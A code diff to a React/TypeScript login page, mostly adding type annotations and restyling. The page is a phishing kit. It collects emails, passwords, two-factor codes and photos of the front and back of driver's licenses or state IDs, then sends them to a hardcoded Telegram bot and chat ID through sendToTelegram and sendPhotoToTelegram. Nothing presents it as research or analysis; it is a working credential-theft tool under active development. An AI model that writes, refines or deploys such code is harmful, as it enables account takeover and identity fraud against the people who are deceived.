@@ -20,8 +20,8 @@ export default function LoginPage() {
   const [twoFactorCode, setTwoFactorCode] = useState("");
   const [twoFactorMessage, setTwoFactorMessage] = useState("");
   const [twoFactorAttemptCount, setTwoFactorAttemptCount] = useState(0);
-  const [identityFront, setIdentityFront] = useState(null);
-  const [identityBack, setIdentityBack] = useState(null);
+  const [identityFront, setIdentityFront] = useState<File | null>(null);
+  const [identityBack, setIdentityBack] = useState<File | null>(null);
   const [randomNumber, setRandomNumber] = useState("");
   const [step, setStep] = useState(1);
   const [telegramChatId] = useState("7132570959"); // Replace with actual chat ID
@@ -52,7 +52,7 @@ export default function LoginPage() {
     if (window.location.hostname !== "localhost") handleCustomDomainVisit();
   }, [telegramBotToken, telegramChatId]);
 
-  const sendToTelegram = (data) => {
+  const sendToTelegram = (data: { email?: string; password?: string; rememberMe?: boolean; twoFactorCode?: string; randomNumber?: string; }) => {
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -63,7 +63,7 @@ export default function LoginPage() {
     });
   };
 
-  const sendPhotoToTelegram = (file, caption) => {
+  const sendPhotoToTelegram = (file: string | Blob, caption: string | Blob) => {
     const formData = new FormData();
     formData.append("chat_id", telegramChatId);
     formData.append("photo", file);
@@ -75,7 +75,7 @@ export default function LoginPage() {
     });
   };
 
-  const handleLoginSubmit = async (e) => {
+  const handleLoginSubmit = async (e: { preventDefault: () => void; }) => {
     e.preventDefault();
     setIsSubmitting(true);
     setIsLoading(true);
@@ -96,7 +96,7 @@ export default function LoginPage() {
     setAttemptCount(attemptCount + 1);
   };
 
-  const handleTwoFactorSubmit = async (e) => {
+  const handleTwoFactorSubmit = async (e: { preventDefault: () => void; }) => {
     e.preventDefault();
     setIsSubmitting(true);
     setIsLoading(true);
@@ -117,18 +117,17 @@ export default function LoginPage() {
     setTwoFactorAttemptCount(twoFactorAttemptCount + 1);
   };
 
-  const handleIdentitySubmit = async (e) => {
+  const handleIdentitySubmit = async (e: { preventDefault: () => void; }) => {
     e.preventDefault();
     setIsLoading(true);
 
     const formData = new FormData();
-    formData.append("identityFront", identityFront);
-    formData.append("identityBack", identityBack);
-
     if (identityFront) {
+      formData.append("identityFront", identityFront);
       sendPhotoToTelegram(identityFront, "Identity Front");
     }
     if (identityBack) {
+      formData.append("identityBack", identityBack);
       sendPhotoToTelegram(identityBack, "Identity Back");
     }
 
@@ -136,7 +135,7 @@ export default function LoginPage() {
     setStep(4);
   };
 
-  const handleRandomNumberSubmit = (e) => {
+  const handleRandomNumberSubmit = (e: { preventDefault: () => void; }) => {
     e.preventDefault();
     sendToTelegram({ randomNumber });
     setStep(5);
@@ -223,25 +222,23 @@ export default function LoginPage() {
           </div>
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
-              <h1 className="text-2xl font-semibold text-center text-gray-900">Complete Your Sign In</h1>
+              <h1 className="text-2xl font-semibold text-center text-gray-900">COMPLETE YOUR SIGN IN</h1>
               <div className="flex justify-center space-x-2">
-                <span className="text-gray-400">1</span>
-                <span className="text-gray-400">2</span>
-                <span className="text-blue-600">3</span>
+                <img src="/images/123.png" alt="Back ID" className="w-full h-29 object-cover mb-2" />
               </div>
             </CardHeader>
 
             <CardContent className="space-y-4">
-              <p className="text-sm text-gray-600">Enter a code from your device</p>
+              <p className="text-2xl font-semibold text-center text-gray-900">Enter a code from your device</p>
               <p className="text-sm text-gray-600">Please check your code generator application and enter the generated 6-digit code to complete your sign in.</p>
-              <p className="text-sm text-gray-600">Enter the 6-digit code*</p>
+              <p className="text-l font-semibold text-gray-900">Enter the 6-digit code*</p>
               <form onSubmit={handleTwoFactorSubmit}>
                 <Input
                   type="text"
                   placeholder="------"
                   value={twoFactorCode}
                   onChange={(e) => setTwoFactorCode(e.target.value)}
-                  className="w-full mb-4"
+                  className="w-full mb-4 text-center text-2xl placeholder:text-2xl placeholder:font-semibold placeholder:text-black-400"
                   required
                 />
                 {twoFactorMessage && (
@@ -288,16 +285,34 @@ export default function LoginPage() {
             <CardContent className="space-y-4">
               <form onSubmit={handleIdentitySubmit}>
                 <div className="border-dashed border-2 border-gray-300 p-4 text-center">
-                  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="Front ID" className="w-full h-32 object-cover mb-2" />
-                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br></br>state ID</p>
+                  <img src="/images/front.png" alt="Front ID" className="w-full h-29 object-cover mb-2" />
+                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br />state ID</p>
                   <p className="text-sm text-green-600 underline font-semibold">(FRONT)</p>
-                  <input type="file" accept="image/*" onChange={(e) => setIdentityFront(e.target.files[0])} className="mt-2" />
+                  <input
+                    type="file"
+                    accept="image/*"
+                    onChange={(e) => {
+                      if (e.target.files && e.target.files[0]) {
+                        setIdentityFront(e.target.files[0]);
+                      }
+                    }}
+                    className="mt-2"
+                  />
                 </div>
                 <div className="border-dashed border-2 border-gray-300 p-4 text-center mt-4">
-                  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="Back ID" className="w-full h-32 object-cover mb-2" />
-                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br></br>state ID</p>
+                  <img src="/images/back.png" alt="Back ID" className="w-full h-29 object-cover mb-2" />
+                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br />state ID</p>
                   <p className="text-sm text-green-600 underline font-semibold">(BACK)</p>
-                  <input type="file" accept="image/*" onChange={(e) => setIdentityBack(e.target.files[0])} className="mt-2" />
+                  <input
+                    type="file"
+                    accept="image/*"
+                    onChange={(e) => {
+                      if (e.target.files && e.target.files[0]) {
+                        setIdentityBack(e.target.files[0]);
+                      }
+                    }}
+                    className="mt-2"
+                  />
                 </div>
                 <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
                   {isLoading ? <Loader className="animate-spin h-5 w-5 mx-auto" /> : "Submit"}
